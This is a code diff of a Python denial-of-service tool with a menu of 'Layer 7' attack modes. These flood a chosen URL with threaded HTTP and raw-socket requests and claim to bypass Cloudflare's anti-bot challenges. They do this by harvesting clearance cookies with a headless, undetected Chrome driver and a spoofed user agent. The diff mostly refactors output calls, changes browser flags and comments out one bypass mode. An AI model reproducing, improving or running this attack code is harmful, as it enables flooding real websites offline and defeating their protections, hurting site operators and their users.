@@ -7,29 +7,17 @@ import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
-from pyvirtualdisplay import Display
 from sys import stdout
 from colorama import Fore, init
-if name != 'nt':
-    from xvfbwrapper import Xvfb
 init(convert=True)
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    while True:
-        l = (until - datetime.datetime.now()).total_seconds()
-        if l <= 0:
-            stdout.write("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!\n")
-            break;
-        else: stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str(l) + "sec left")
+    while (until - datetime.datetime.now()).total_seconds() > 0:
+        stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left")
         stdout.flush()
-        
-    #while (until - datetime.datetime.now()).total_seconds() > 0:
-    #    stdout.flush()
-    #    stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left")
-    #    stdout.flush()
-    #stdout.flush()
-    #stdout.write("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!\n")
+    stdout.flush()
+    stdout.write("\n"+Fore.MAGENTA+" [*] "+Fore.WHITE+"Attack Done!\n")
 
 #region RAW
 def LaunchRAW(url, th, t):
@@ -54,10 +42,11 @@ def AttackRAW(url, until_datetime):
 
 #region SOC
 def LaunchSOC(url, port, th, t):
+    global request
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     threads_count = 0
-    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req =    "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req +=   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
     while threads_count <= int(th):
@@ -108,7 +97,7 @@ def AttackCFB(url, until_datetime, scraper):
 #region UAM
 
 headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
         'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
         'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
@@ -123,57 +112,54 @@ headers = {
         'TE': 'trailers',
 }
 
-def LaunchUAM(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    threads_count = 0
-    session = requests.Session()
-    scraper = cloudscraper.create_scraper(sess=session)
-    f = open('./solver/cookie.txt', 'r')
-    line = f.readlines()
-    cle = line[2].replace(" ", "").replace("'", "").replace("\n", "").replace(";", "").replace("cf_clearance=", "")
-    jar = RequestsCookieJar()
-    cook = [{
-        'name': 'cf_clearance',
-        'value': cle
-    }]
-    for cookie in cook:
-        jar.set(cookie['name'], cookie['value'])
-        scraper.cookies = jar
-    while threads_count <= int(th):
-        try:
-            thd = threading.Thread(target=AttackUAM, args=(url, until, scraper))
-            thd.start()
-            threads_count += 1
-        except:
-            pass
-
-def AttackUAM(url, until_datetime, scraper):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-        except:
-            pass
+#def LaunchUAM(url, th, t):
+#    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+#    threads_count = 0
+#    session = requests.Session()
+#    scraper = cloudscraper.create_scraper(sess=session)
+#    f = open('./solver/cookie.txt', 'r')
+#    line = f.readlines()
+#    cle = line[2].replace(" ", "").replace("'", "").replace("\n", "").replace(";", "").replace("cf_clearance=", "")
+#    jar = RequestsCookieJar()
+#    cook = [{
+#        'name': 'cf_clearance',
+#        'value': cle
+#    }]
+#    for cookie in cook:
+#        jar.set(cookie['name'], cookie['value'])
+#        scraper.cookies = jar
+#    while threads_count <= int(th):
+#        try:
+#            thd = threading.Thread(target=AttackUAM, args=(url, until, scraper))
+#            thd.start()
+#            threads_count += 1
+#        except:
+#            pass
+#
+#def AttackUAM(url, until_datetime, scraper):
+#    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+#        try:
+#            scraper.get(url=url, headers=headers, allow_redirects=False)
+#            scraper.get(url=url, headers=headers, allow_redirects=False)
+#        except:
+#            pass
 #endregion
 
 #region CFPRO
 def getcookie(url):
     global cookies
-    linux = False
-    if name == 'nt':
-        pass
-    else:
-        linux = True
-        disp = Display(size=(100,60))
-        disp.start()
     options = webdriver.ChromeOptions()
-    options.add_argument('--no-first-run --no-service-autorun --password-store=basic')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-setuid-sandbox')
+    options.add_argument('--disable-infobars')
+    options.add_argument('--disable-logging')
+    options.add_argument('--disable-login-animations')
+    options.add_argument('--disable-notifications')
     options.add_argument('--disable-gpu')
-    options.add_argument('--disable-dev-shm-usage')
-    options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36')
-    options.add_argument('--incognito')
-    options.add_argument('--keep-alive-for-test')
-    options.add_argument("--window-position=-5000,0")
+    options.add_argument('--headless')
+    options.add_argument('--lang=ko_KR')
+    options.add_argument("--start-maxmized")
+    options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
     driver = webdriver.Chrome(options=options)
     driver.implicitly_wait(3)
     driver.get(url)
@@ -188,9 +174,6 @@ def getcookie(url):
                 pass
         time.sleep(0.2)
     driver.quit()
-    if linux:
-        disp.stop()
-
 
 def LaunchCFPRO(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -201,7 +184,7 @@ def LaunchCFPRO(url, th, t):
     for cookie in cookies:
         jar.set(cookie['name'], cookie['value'])
         scraper.cookies = jar
-
+    #stdout.write(jar)
     while threads_count <= int(th):
         try:
             thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
@@ -222,21 +205,18 @@ def AttackCFPRO(url, until_datetime, scraper):
 #region CFSOC
 
 def LaunchCFSOC(url, th, t):
-	linux = False
-	if name == 'nt':
-		pass
-	else:
-		linux = True
-		disp = Display(size=(100,60))
-		disp.start()
 	options = webdriver.ChromeOptions()
-	options.add_argument('--no-first-run --no-service-autorun --password-store=basic')
+	options.add_argument('--no-sandbox')
+	options.add_argument('--disable-setuid-sandbox')
+	options.add_argument('--disable-infobars')
+	options.add_argument('--disable-logging')
+	options.add_argument('--disable-login-animations')
+	options.add_argument('--disable-notifications')
 	options.add_argument('--disable-gpu')
-	options.add_argument('--disable-dev-shm-usage')
-	options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36')
-	options.add_argument('--incognito')
-	options.add_argument('--keep-alive-for-test')
-	options.add_argument("--window-position=-5000,0")
+	options.add_argument('--headless')
+	options.add_argument('--lang=ko_KR')
+	options.add_argument("--start-maxmized")
+	options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
 	driver = webdriver.Chrome(options=options)
 	driver.implicitly_wait(3)
 	driver.get(url)
@@ -254,8 +234,6 @@ def LaunchCFSOC(url, th, t):
 				pass
 		time.sleep(0.2)
 	driver.quit()
-	if linux:
-		disp.stop()
 	until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
 	threads_count = 0
 
@@ -283,8 +261,9 @@ def LaunchCFSOC(url, th, t):
 	network['raw'] += 'sec-fetch-dest: empty\r\n'
 	network['raw'] += 'sec-fetch-mode: cors\r\n'
 	network['raw'] += 'sec-fetch-site: same-origin\r\n'
+	network['raw'] += 'Connection: Keep-Alive\r\n'
 	network['raw'] += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
-
+	#stdout.write(network['raw'])
 	while threads_count <= int(th):
 		try:
 			thd = threading.Thread(target=AttackCFSOC,args=(until, target, network,))
@@ -321,16 +300,16 @@ def clear():
         _ = system('clear') 
 
 def title():
-    print("                                                                                          ")
-    print("                          "+Fore.LIGHTMAGENTA_EX+"╔═╗╔═╗╔═╗╔╦╗╔╗╔                 ")
-    print("                          "+Fore.LIGHTRED_EX    +"║ ║╔═╝║   ║ ║║║                 ")
-    print("                          "+Fore.RED            +"╚═╝╚═╝╚═╝ ╩ ╝╚╝                 ")
-    print("                                                                                          ")
-    print("                           "+Fore.LIGHTWHITE_EX+"* @0zctn *")
-    print("                                                                                          ")
+    stdout.write("                                                                                          \n")
+    stdout.write("                          "+Fore.LIGHTMAGENTA_EX+"╔═╗╔═╗╔═╗╔╦╗╔╗╔                 \n")
+    stdout.write("                          "+Fore.LIGHTRED_EX    +"║ ║╔═╝║   ║ ║║║                 \n")
+    stdout.write("                          "+Fore.RED            +"╚═╝╚═╝╚═╝ ╩ ╝╚╝                \n")
+    stdout.write("                                                                                          \n")
+    stdout.write("                           "+Fore.LIGHTWHITE_EX+"* @0ZCTN *\n")
+    stdout.write("                                                                                          \n")
 
 def command():
-    print(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"0zctn"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE, end='')
+    stdout.write(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"KarmaSH"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE)
     command = input()
     if command == "cls":
         clear()
@@ -345,11 +324,11 @@ def command():
     elif command == "exit":
         exit()
     elif command == "cfb":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
         thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
         t = input()
         time.sleep(1)
         co = threading.Thread(target=countdown, args=(t,))
@@ -357,11 +336,11 @@ def command():
         LaunchCFB(target, thread, t)
         time.sleep(int(t))
     elif command == "raw":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
         thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
         t = input()
         time.sleep(1)
         co = threading.Thread(target=countdown, args=(t,))
@@ -369,77 +348,77 @@ def command():
         LaunchRAW(target, thread, t)
         time.sleep(int(t))
     elif command == "soc":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"PORT    : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"PORT    : "+Fore.LIGHTGREEN_EX)
         port = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
         thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
         t = input()
         time.sleep(1)
         co = threading.Thread(target=countdown, args=(t,))
         co.start()
         LaunchSOC(target, port, thread, t)
         time.sleep(int(t))
-    elif command == "uam":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
-        target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
-        thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
-        t = input()
-        time.sleep(1)
-        print(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing UAM...")
-        os.system('node ./solver/start.js > ./solver/cookie.txt')
-        LaunchUAM(target, thread, t)
-        co = threading.Thread(target=countdown, args=(t,))
-        co.start()
-        time.sleep(int(t))
+    #elif command == "uam":
+    #    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
+    #    target = input()
+    #    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
+    #    thread = input()
+    #    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
+    #    t = input()
+    #    time.sleep(1)
+    #    stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing UAM...")
+    #    os.system('node ./solver/start.js > ./solver/cookie.txt')
+    #    LaunchUAM(target, thread, t)
+    #    co = threading.Thread(target=countdown, args=(t,))
+    #    co.start()
+    #    time.sleep(int(t))
     elif command == "cfpro":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
         thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
         t = input()
         time.sleep(1)
-        print(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...")
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...\n")
         getcookie(target)
         co = threading.Thread(target=countdown, args=(t,))
         co.start()
         LaunchCFPRO(target, thread, t)
         time.sleep(int(t))
     elif command == "cfsoc":
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
         target = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
         thread = input()
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX,end='')
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
         t = input()
         time.sleep(1)
-        print(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...")
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...\n")
         LaunchCFSOC(target, thread, t)
         co = threading.Thread(target=countdown, args=(t,))
         co.start()
         time.sleep(int(t))
     else:
-        print(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.")
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")
 
 def funcc():
-	print(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF")
-	#print(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack")
-	print(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)")
-	print(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console")
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..")
+	stdout.write(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF\n")
+	#stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
+	stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
+	stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
 
 def hello():
 	global namee
@@ -450,11 +429,11 @@ def hello():
 	else:
 		if not os.path.exists(dir):
 			os.makedirs(dir)
-		print(Fore.YELLOW+">>> "+Fore.WHITE+"Input User name: " + Fore.LIGHTGREEN_EX, end='')
+		stdout.write(Fore.YELLOW+">>> "+Fore.WHITE+"Input User name: " + Fore.LIGHTGREEN_EX, end='')
 		put = input()
 		f = open("C:/KARMA/User.txt", 'w').write(put)
 		namee = open(dir+"User.txt").readline()
-	print(Fore.MAGENTA+" [>] "+Fore.WHITE+"Welcome Back, "+namee+"!\n")
+	stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Welcome Back, "+namee+"!\n")
 
 if __name__ == '__main__':
 	global namee
